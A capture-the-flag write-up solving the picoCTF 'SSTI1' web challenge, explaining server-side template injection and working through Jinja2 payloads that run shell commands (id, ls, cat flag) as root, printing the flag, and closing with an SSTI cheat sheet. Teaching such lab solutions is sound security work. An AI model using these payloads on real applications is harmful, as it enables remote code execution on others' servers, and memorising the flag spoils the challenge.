# SSTI1 - Server-Side Template Injection Walkthrough

**Challenge Name:** SSTI1   
**Author:** Venax  
**Category:** Web Exploitation  


---

## ğŸ§  Description

> *"I made a cool website where you can announce whatever you want! Try it out!  
> I heard templating is a cool and modular way to build web apps! Check out my website here!"*

We're presented with a simple web app that allows user-submitted announcements. The twist? It's built using a server-side templating engine. Our mission is to test the app for **Server-Side Template Injection (SSTI)** vulnerabilities â€” and if found, exploit it to retrieve a hidden flag.

---

## ğŸ“˜ What is SSTI?

**Server-Side Template Injection (SSTI)** happens when user input is unsafely incorporated into a template that the server renders. If the input is evaluated as part of the template, attackers may execute arbitrary code on the backend.

This can lead to:
- Information disclosure (e.g., config values, environment variables)
- Command execution on the server
- Full remote code execution (RCE)

### ğŸ’¡ Common Template Engines Vulnerable to SSTI:
- **Jinja2** (Python - Flask)
- **Twig** (PHP - Symfony)
- **Smarty** (PHP)
- **ERB** (Ruby)
- **Velocity** (Java)

### ğŸ” Detecting SSTI

Start with a basic arithmetic test:
```jinja
{{7*7}}
```
If the output returns `49`, the input is being interpreted â€” indicating a vulnerable template engine.

---

## ğŸ•µï¸â€â™‚ï¸ Recon & Initial Testing

Injected the test payload:
```jinja
{{7*7}}
```

**Output:**
```
49
```

âœ… This confirms the input is evaluated. Based on the syntax, it's most likely using **Jinja2** (commonly found in Python Flask apps).

---

## ğŸ§¨ Exploitation Process

With Jinja2, we can abuse Pythonâ€™s introspection capabilities to break out of the sandbox and interact with system-level features.

### âœ… Step 1: Run a System Command

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Explanation:**
- `__import__('os')` brings in the OS module.
- `popen('id')` runs the `id` command in the shell.
- `read()` captures the output.

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

âœ… Remote code execution as the **root** user.

---

### ğŸ“ Step 2: View Files in Current Directory

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

**Output:**
```
__pycache__  app.py  flag  requirements.txt
```

ğŸ“ Now we know the file containing the flag is named `flag`.

---

### ğŸ Step 3: Read the Flag

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

**Flag:**
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}
```

---

## ğŸ“ Key Takeaways

- **SSTI is critical** â€” it can lead to server takeover if not properly mitigated.
- Never embed raw user input into templates without escaping or sanitization.
- Jinja2 and other engines support introspection features that attackers can leverage.
- Use proper input handling and sandboxing when working with dynamic templates.

---

## ğŸ§° Jinja2 Cheat Sheet for SSTI

```jinja
{{7*7}}                                 # Basic evaluation test
{{config}}                              # Access app config (may leak secrets)
{{self}}                                # Inspect current object/context
{{cycler.__init__.__globals__}}        # Get access to global variables
{{cycler.__init__.__globals__.os.popen('ls').read()}}  # Run OS commands
```
